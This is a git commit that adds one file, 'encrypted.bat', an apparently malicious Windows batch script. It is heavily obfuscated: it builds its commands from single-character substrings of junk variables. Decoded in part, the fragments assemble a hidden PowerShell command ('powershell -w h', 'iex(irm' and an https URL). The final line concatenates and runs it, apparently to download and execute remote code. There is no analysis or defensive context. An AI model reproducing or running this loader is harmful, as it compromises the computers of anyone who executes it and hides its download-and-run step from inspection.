f2c69499edbf79c07dd2d34a46ea1f09382a953b
2oi341o2312o <calvertchase54@gmail.com>
2026-05-13 22:14:02 -0500

    Add files via upload

---
+++ encrypted.bat
@@ -0,0 +1,76 @@
+@echo OFF
+Set LaqerHrsidVbAYw=OQKkvFYhqycTfL
+:: AKMt
+Set qbhRxuorPHifWHwUoS=AM
+
+Set fLAmLuPpm=HEa
+REM AfEH
+
+Set iGCcurY=duNoPwSlxjegirsXItWUDBJm
+:: EkOQZMt
+Set lOktVNzAX=R
+
+Set GhwMfkuVMVPEYwfi=GVpCbZz
+:: mlmh
+Set dVvhnfFI=n
+:: MspwEEOdSgueJ
+
+Set kkAzsRCrJyOtR=8756
+Set yXsrZUVHezNUQP=rxxiLsCvpxn
+Set qVLtmC=JCPQPsUsEia
+Set DdCTcLgGUwCbgP=1870
+Set ThOjJbpigSTXJ=WtCMS
+Cls
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1%%iGCcurY:~7,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~10,1%%fLAmLuPpm:~2,1%%iGCcurY:~7,1% %fLAmLuPpm:~1,1%%dVvhnfFI:~0,1%%fLAmLuPpm:~2,1%%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~7,1%%iGCcurY:~10,1%%iGCcurY:~20,1%%iGCcurY:~10,1%%iGCcurY:~7,1%%fLAmLuPpm:~2,1%%LaqerHrsidVbAYw:~9,1%%iGCcurY:~10,1%%iGCcurY:~0,1%%fLAmLuPpm:~1,1%%iGCcurY:~8,1%%GhwMfkuVMVPEYwfi:~2,1%%fLAmLuPpm:~2,1%%dVvhnfFI:~0,1%%iGCcurY:~14,1%%iGCcurY:~12,1%%iGCcurY:~3,1%%dVvhnfFI:~0,1%
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~13,1%%iGCcurY:~14,1%%LaqerHrsidVbAYw:~4,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~5,1%%fLAmLuPpm:~1,1%=4%LaqerHrsidVbAYw:~10,1%/%iGCcurY:~11,1%%LaqerHrsidVbAYw:~7,1%%LaqerHrsidVbAYw:~7,1%"
+:: %LaqerHrsidVbAYw:~13,1%%iGCcurY:~17,1%%iGCcurY:~23,1%%GhwMfkuVMVPEYwfi:~3,1%%LaqerHrsidVbAYw:~12,1%%iGCcurY:~7,1%%iGCcurY:~22,1%%GhwMfkuVMVPEYwfi:~3,1%
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~13,1%%LaqerHrsidVbAYw:~5,1%%iGCcurY:~17,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~4,1%=%iGCcurY:~23,1%%GhwMfkuVMVPEYwfi:~2,1%%LaqerHrsidVbAYw:~12,1%%iGCcurY:~12,1%%iGCcurY:~7,1%%iGCcurY:~10,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~14,1%%iGCcurY:~19,1%%iGCcurY:~14,1%%fLAmLuPpm:~1,1%%iGCcurY:~12,1%%fLAmLuPpm:~2,1%=8783"
+:: %LaqerHrsidVbAYw:~11,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~13,1%%iGCcurY:~11,1%
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~1,1%%GhwMfkuVMVPEYwfi:~5,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~17,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~12,1%%qbhRxuorPHifWHwUoS:~0,1%=%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~10,1%1"
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~10,1%%fLAmLuPpm:~2,1%%LaqerHrsidVbAYw:~6,1%%iGCcurY:~2,1%%iGCcurY:~11,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~0,1%%iGCcurY:~7,1%%GhwMfkuVMVPEYwfi:~1,1%%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~23,1%%iGCcurY:~2,1%=%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~7,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~7,1%%LaqerHrsidVbAYw:~12,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~5,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~6,1%%iGCcurY:~9,1%%iGCcurY:~14,1%%LaqerHrsidVbAYw:~4,1%%iGCcurY:~17,1%=1"
+:: %LaqerHrsidVbAYw:~7,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~9,1%%iGCcurY:~22,1%%GhwMfkuVMVPEYwfi:~4,1%%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~12,1%
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~8,1%%LaqerHrsidVbAYw:~8,1%%fLAmLuPpm:~2,1%%iGCcurY:~4,1%%iGCcurY:~12,1%%GhwMfkuVMVPEYwfi:~4,1%%LaqerHrsidVbAYw:~9,1%%LaqerHrsidVbAYw:~2,1%%iGCcurY:~19,1%%LaqerHrsidVbAYw:~2,1%%iGCcurY:~22,1%%LaqerHrsidVbAYw:~1,1%%iGCcurY:~13,1%=05-"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~12,1%%iGCcurY:~16,1%%iGCcurY:~16,1%%iGCcurY:~18,1%%iGCcurY:~5,1%=%iGCcurY:~17,1%%GhwMfkuVMVPEYwfi:~2,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~18,1%%iGCcurY:~17,1%%GhwMfkuVMVPEYwfi:~3,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~6,1%%iGCcurY:~13,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~4,1%%GhwMfkuVMVPEYwfi:~1,1%=4832"
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%qbhRxuorPHifWHwUoS:~1,1%%fLAmLuPpm:~2,1%%GhwMfkuVMVPEYwfi:~6,1%%GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~19,1%%iGCcurY:~21,1%%iGCcurY:~6,1%%LaqerHrsidVbAYw:~4,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~0,1%%lOktVNzAX:~0,1%=%iGCcurY:~12,1%%LaqerHrsidVbAYw:~10,1%/2026-"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~9,1%%qbhRxuorPHifWHwUoS:~0,1%%fLAmLuPpm:~2,1%%LaqerHrsidVbAYw:~13,1%%LaqerHrsidVbAYw:~5,1%%LaqerHrsidVbAYw:~3,1%%iGCcurY:~21,1%%LaqerHrsidVbAYw:~13,1%%iGCcurY:~22,1%%iGCcurY:~17,1%=420"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~17,1%%iGCcurY:~0,1%%LaqerHrsidVbAYw:~13,1%%iGCcurY:~9,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~5,1%%LaqerHrsidVbAYw:~1,1%%GhwMfkuVMVPEYwfi:~3,1%%qbhRxuorPHifWHwUoS:~1,1%%LaqerHrsidVbAYw:~11,1%=%iGCcurY:~14,1%://%iGCcurY:~0,1%.%iGCcurY:~17,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~7,1%%iGCcurY:~22,1%%GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~9,1%%GhwMfkuVMVPEYwfi:~1,1%%iGCcurY:~4,1%%iGCcurY:~13,1%%iGCcurY:~12,1%%LaqerHrsidVbAYw:~8,1%%LaqerHrsidVbAYw:~3,1%=%LaqerHrsidVbAYw:~7,1%%iGCcurY:~10,1%%iGCcurY:~7,1%"
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~0,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~1,1%%LaqerHrsidVbAYw:~8,1%%fLAmLuPpm:~1,1%%GhwMfkuVMVPEYwfi:~5,1%%LaqerHrsidVbAYw:~11,1%%iGCcurY:~13,1%=%LaqerHrsidVbAYw:~7,1%%iGCcurY:~17,1%"
+:: %fLAmLuPpm:~1,1%%LaqerHrsidVbAYw:~8,1%%LaqerHrsidVbAYw:~4,1%%GhwMfkuVMVPEYwfi:~3,1%%LaqerHrsidVbAYw:~5,1%%iGCcurY:~17,1%
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~15,1%%iGCcurY:~8,1%%iGCcurY:~4,1%%iGCcurY:~13,1%%LaqerHrsidVbAYw:~13,1%%LaqerHrsidVbAYw:~1,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~6,1%%qbhRxuorPHifWHwUoS:~0,1%%LaqerHrsidVbAYw:~12,1%%GhwMfkuVMVPEYwfi:~5,1%=.%iGCcurY:~7,1%%iGCcurY:~12,1%%dVvhnfFI:~0,1%%LaqerHrsidVbAYw:~3,1%/%GhwMfkuVMVPEYwfi:~2,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~20,1%%iGCcurY:~20,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~20,1%%qbhRxuorPHifWHwUoS:~0,1%%LaqerHrsidVbAYw:~12,1%%fLAmLuPpm:~1,1%%fLAmLuPpm:~0,1%%qbhRxuorPHifWHwUoS:~1,1%%fLAmLuPpm:~1,1%%iGCcurY:~13,1%%iGCcurY:~6,1%%fLAmLuPpm:~1,1%%LaqerHrsidVbAYw:~3,1%=8-%fLAmLuPpm:~2,1%9%iGCcurY:~10,1%%LaqerHrsidVbAYw:~10,1%-"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~17,1%%LaqerHrsidVbAYw:~2,1%%iGCcurY:~4,1%%iGCcurY:~11,1%%iGCcurY:~14,1%=%iGCcurY:~10,1%"
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~10,1%%iGCcurY:~22,1%%iGCcurY:~21,1%%iGCcurY:~1,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~3,1%%LaqerHrsidVbAYw:~3,1%%qbhRxuorPHifWHwUoS:~0,1%%GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~14,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~13,1%=%iGCcurY:~13,1%."
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~2,1%%iGCcurY:~9,1%%iGCcurY:~22,1%%LaqerHrsidVbAYw:~2,1%=1121"
+%lOktVNzAX:~0,1%%fLAmLuPpm:~1,1%%qbhRxuorPHifWHwUoS:~1,1% %fLAmLuPpm:~0,1%%LaqerHrsidVbAYw:~8,1%%LaqerHrsidVbAYw:~5,1%%fLAmLuPpm:~0,1%%LaqerHrsidVbAYw:~5,1%%iGCcurY:~12,1%%iGCcurY:~5,1%%dVvhnfFI:~0,1%%iGCcurY:~18,1%%iGCcurY:~19,1%
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~12,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~6,1%%iGCcurY:~7,1%%LaqerHrsidVbAYw:~1,1%%iGCcurY:~22,1%=75537-%GhwMfkuVMVPEYwfi:~4,1%0"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~14,1%%iGCcurY:~14,1%%iGCcurY:~23,1%%fLAmLuPpm:~1,1%%iGCcurY:~2,1%%iGCcurY:~10,1%%iGCcurY:~4,1%%iGCcurY:~7,1%%iGCcurY:~14,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~6,1%%LaqerHrsidVbAYw:~8,1%%LaqerHrsidVbAYw:~2,1%%GhwMfkuVMVPEYwfi:~2,1%=%iGCcurY:~12,1%%iGCcurY:~10,1%%iGCcurY:~8,1%(%iGCcurY:~12,1%%iGCcurY:~13,1%%iGCcurY:~23,1% "
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%lOktVNzAX:~0,1%%iGCcurY:~10,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~15,1%%iGCcurY:~13,1%%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~20,1%%iGCcurY:~16,1%%iGCcurY:~21,1%%GhwMfkuVMVPEYwfi:~1,1%=%iGCcurY:~7,1% -%iGCcurY:~5,1% %LaqerHrsidVbAYw:~7,1% "
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~17,1%%fLAmLuPpm:~1,1%%iGCcurY:~23,1%%iGCcurY:~7,1%%iGCcurY:~23,1%%LaqerHrsidVbAYw:~7,1%=060196%LaqerHrsidVbAYw:~12,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~6,1%%iGCcurY:~20,1%%iGCcurY:~15,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~6,1%%LaqerHrsidVbAYw:~11,1%%iGCcurY:~2,1%%iGCcurY:~22,1%%LaqerHrsidVbAYw:~12,1%%LaqerHrsidVbAYw:~7,1%=%fLAmLuPpm:~2,1%%iGCcurY:~13,1%%iGCcurY:~17,1% /%iGCcurY:~23,1%%iGCcurY:~12,1%%dVvhnfFI:~0,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~1,1%%iGCcurY:~20,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~17,1%%LaqerHrsidVbAYw:~3,1%%GhwMfkuVMVPEYwfi:~2,1%%LaqerHrsidVbAYw:~7,1%%GhwMfkuVMVPEYwfi:~1,1%%iGCcurY:~23,1%%iGCcurY:~19,1%=7595"
+:: %qbhRxuorPHifWHwUoS:~0,1%%iGCcurY:~10,1%%iGCcurY:~18,1%%iGCcurY:~14,1%%iGCcurY:~1,1%%GhwMfkuVMVPEYwfi:~5,1%
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~2,1%%LaqerHrsidVbAYw:~0,1%%GhwMfkuVMVPEYwfi:~4,1%%LaqerHrsidVbAYw:~13,1%%iGCcurY:~0,1%%iGCcurY:~22,1%=%iGCcurY:~14,1%%iGCcurY:~17,1%"
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~0,1%%iGCcurY:~0,1%%iGCcurY:~6,1%%iGCcurY:~11,1%=%iGCcurY:~9,1%%iGCcurY:~11,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%GhwMfkuVMVPEYwfi:~2,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~10,1%%iGCcurY:~12,1%%LaqerHrsidVbAYw:~0,1%%LaqerHrsidVbAYw:~12,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~4,1%%LaqerHrsidVbAYw:~7,1%%lOktVNzAX:~0,1%%dVvhnfFI:~0,1%%LaqerHrsidVbAYw:~2,1%=2/7%fLAmLuPpm:~2,1%"
+:: %GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~16,1%%iGCcurY:~4,1%%iGCcurY:~3,1%%iGCcurY:~17,1%%iGCcurY:~7,1%%LaqerHrsidVbAYw:~10,1%
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~2,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~17,1%%GhwMfkuVMVPEYwfi:~1,1%=28"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~9,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~17,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~5,1%=%GhwMfkuVMVPEYwfi:~2,1%%dVvhnfFI:~0,1%%iGCcurY:~11,1%)"
+
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~6,1%%fLAmLuPpm:~0,1%%fLAmLuPpm:~1,1%%iGCcurY:~1,1%%LaqerHrsidVbAYw:~7,1%%GhwMfkuVMVPEYwfi:~5,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~6,1%%GhwMfkuVMVPEYwfi:~1,1%%GhwMfkuVMVPEYwfi:~4,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~10,1%%GhwMfkuVMVPEYwfi:~3,1%=31-4"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%LaqerHrsidVbAYw:~1,1%%fLAmLuPpm:~1,1%%GhwMfkuVMVPEYwfi:~1,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~2,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~11,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~15,1%%iGCcurY:~23,1%%iGCcurY:~21,1%%iGCcurY:~10,1%= %GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~3,1%%iGCcurY:~5,1%%iGCcurY:~10,1%%iGCcurY:~13,1%%iGCcurY:~14,1%"
+%iGCcurY:~14,1%%iGCcurY:~10,1%%iGCcurY:~17,1% "%iGCcurY:~18,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~22,1%%iGCcurY:~10,1%=%iGCcurY:~1,1%"
+!%LaqerHrsidVbAYw:~2,1%%LaqerHrsidVbAYw:~0,1%%GhwMfkuVMVPEYwfi:~4,1%%LaqerHrsidVbAYw:~13,1%%iGCcurY:~0,1%%iGCcurY:~22,1%!!%LaqerHrsidVbAYw:~6,1%%iGCcurY:~20,1%%iGCcurY:~15,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~6,1%%LaqerHrsidVbAYw:~11,1%%iGCcurY:~2,1%%iGCcurY:~22,1%%LaqerHrsidVbAYw:~12,1%%LaqerHrsidVbAYw:~7,1%!!%LaqerHrsidVbAYw:~1,1%%fLAmLuPpm:~1,1%%GhwMfkuVMVPEYwfi:~1,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~2,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~11,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~15,1%%iGCcurY:~23,1%%iGCcurY:~21,1%%iGCcurY:~10,1%!!%LaqerHrsidVbAYw:~7,1%%iGCcurY:~22,1%%GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~9,1%%GhwMfkuVMVPEYwfi:~1,1%%iGCcurY:~4,1%%iGCcurY:~13,1%%iGCcurY:~12,1%%LaqerHrsidVbAYw:~8,1%%LaqerHrsidVbAYw:~3,1%!!%lOktVNzAX:~0,1%%iGCcurY:~10,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~15,1%%iGCcurY:~13,1%%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~20,1%%iGCcurY:~16,1%%iGCcurY:~21,1%%GhwMfkuVMVPEYwfi:~1,1%!!%iGCcurY:~14,1%%iGCcurY:~14,1%%iGCcurY:~23,1%%fLAmLuPpm:~1,1%%iGCcurY:~2,1%%iGCcurY:~10,1%%iGCcurY:~4,1%%iGCcurY:~7,1%%iGCcurY:~14,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~6,1%%LaqerHrsidVbAYw:~8,1%%LaqerHrsidVbAYw:~2,1%%GhwMfkuVMVPEYwfi:~2,1%!!%iGCcurY:~0,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~1,1%%LaqerHrsidVbAYw:~8,1%%fLAmLuPpm:~1,1%%GhwMfkuVMVPEYwfi:~5,1%%LaqerHrsidVbAYw:~11,1%%iGCcurY:~13,1%!!%LaqerHrsidVbAYw:~12,1%%iGCcurY:~16,1%%iGCcurY:~16,1%%iGCcurY:~18,1%%iGCcurY:~5,1%!!%iGCcurY:~17,1%%iGCcurY:~0,1%%LaqerHrsidVbAYw:~13,1%%iGCcurY:~9,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~5,1%%LaqerHrsidVbAYw:~1,1%%GhwMfkuVMVPEYwfi:~3,1%%qbhRxuorPHifWHwUoS:~1,1%%LaqerHrsidVbAYw:~11,1%!!%iGCcurY:~13,1%%LaqerHrsidVbAYw:~5,1%%iGCcurY:~17,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~4,1%!!%iGCcurY:~15,1%%iGCcurY:~8,1%%iGCcurY:~4,1%%iGCcurY:~13,1%%LaqerHrsidVbAYw:~13,1%%LaqerHrsidVbAYw:~1,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~6,1%%qbhRxuorPHifWHwUoS:~0,1%%LaqerHrsidVbAYw:~12,1%%GhwMfkuVMVPEYwfi:~5,1%!!%iGCcurY:~18,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~22,1%%iGCcurY:~10,1%!!%iGCcurY:~10,1%%fLAmLuPpm:~2,1%%LaqerHrsidVbAYw:~6,1%%iGCcurY:~2,1%%iGCcurY:~11,1%%iGCcurY:~15,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~0,1%%iGCcurY:~7,1%%GhwMfkuVMVPEYwfi:~1,1%%GhwMfkuVMVPEYwfi:~4,1%%iGCcurY:~23,1%%iGCcurY:~2,1%!!%qbhRxuorPHifWHwUoS:~1,1%%fLAmLuPpm:~2,1%%GhwMfkuVMVPEYwfi:~6,1%%GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~19,1%%iGCcurY:~21,1%%iGCcurY:~6,1%%LaqerHrsidVbAYw:~4,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~0,1%%lOktVNzAX:~0,1%!!%iGCcurY:~8,1%%LaqerHrsidVbAYw:~8,1%%fLAmLuPpm:~2,1%%iGCcurY:~4,1%%iGCcurY:~12,1%%GhwMfkuVMVPEYwfi:~4,1%%LaqerHrsidVbAYw:~9,1%%LaqerHrsidVbAYw:~2,1%%iGCcurY:~19,1%%LaqerHrsidVbAYw:~2,1%%iGCcurY:~22,1%%LaqerHrsidVbAYw:~1,1%%iGCcurY:~13,1%!!%LaqerHrsidVbAYw:~7,1%%LaqerHrsidVbAYw:~12,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~5,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~6,1%%iGCcurY:~9,1%%iGCcurY:~14,1%%LaqerHrsidVbAYw:~4,1%%iGCcurY:~17,1%!!%GhwMfkuVMVPEYwfi:~2,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~10,1%%iGCcurY:~12,1%%LaqerHrsidVbAYw:~0,1%%LaqerHrsidVbAYw:~12,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~4,1%%LaqerHrsidVbAYw:~7,1%%lOktVNzAX:~0,1%%dVvhnfFI:~0,1%%LaqerHrsidVbAYw:~2,1%!!%iGCcurY:~17,1%%LaqerHrsidVbAYw:~2,1%%iGCcurY:~4,1%%iGCcurY:~11,1%%iGCcurY:~14,1%!!%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~12,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~6,1%%iGCcurY:~7,1%%LaqerHrsidVbAYw:~1,1%%iGCcurY:~22,1%!!%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~6,1%%fLAmLuPpm:~0,1%%fLAmLuPpm:~1,1%%iGCcurY:~1,1%%LaqerHrsidVbAYw:~7,1%%GhwMfkuVMVPEYwfi:~5,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~6,1%%GhwMfkuVMVPEYwfi:~1,1%%GhwMfkuVMVPEYwfi:~4,1%%GhwMfkuVMVPEYwfi:~0,1%%iGCcurY:~10,1%%GhwMfkuVMVPEYwfi:~3,1%!!%LaqerHrsidVbAYw:~2,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~17,1%%GhwMfkuVMVPEYwfi:~1,1%!!%iGCcurY:~20,1%%iGCcurY:~20,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~20,1%%qbhRxuorPHifWHwUoS:~0,1%%LaqerHrsidVbAYw:~12,1%%fLAmLuPpm:~1,1%%fLAmLuPpm:~0,1%%qbhRxuorPHifWHwUoS:~1,1%%fLAmLuPpm:~1,1%%iGCcurY:~13,1%%iGCcurY:~6,1%%fLAmLuPpm:~1,1%%LaqerHrsidVbAYw:~3,1%!!%LaqerHrsidVbAYw:~1,1%%GhwMfkuVMVPEYwfi:~5,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~17,1%%LaqerHrsidVbAYw:~10,1%%LaqerHrsidVbAYw:~12,1%%qbhRxuorPHifWHwUoS:~0,1%!!%iGCcurY:~17,1%%fLAmLuPpm:~1,1%%iGCcurY:~23,1%%iGCcurY:~7,1%%iGCcurY:~23,1%%LaqerHrsidVbAYw:~7,1%!!%LaqerHrsidVbAYw:~13,1%%iGCcurY:~14,1%%LaqerHrsidVbAYw:~4,1%%qbhRxuorPHifWHwUoS:~1,1%%iGCcurY:~14,1%%GhwMfkuVMVPEYwfi:~2,1%%iGCcurY:~5,1%%fLAmLuPpm:~1,1%!!%LaqerHrsidVbAYw:~0,1%%iGCcurY:~0,1%%iGCcurY:~6,1%%iGCcurY:~11,1%!!%iGCcurY:~10,1%%iGCcurY:~22,1%%iGCcurY:~21,1%%iGCcurY:~1,1%%iGCcurY:~3,1%%LaqerHrsidVbAYw:~3,1%%LaqerHrsidVbAYw:~3,1%%qbhRxuorPHifWHwUoS:~0,1%%GhwMfkuVMVPEYwfi:~6,1%%iGCcurY:~14,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~3,1%%iGCcurY:~13,1%!!%LaqerHrsidVbAYw:~9,1%%LaqerHrsidVbAYw:~0,1%%iGCcurY:~17,1%%lOktVNzAX:~0,1%%GhwMfkuVMVPEYwfi:~5,1%!
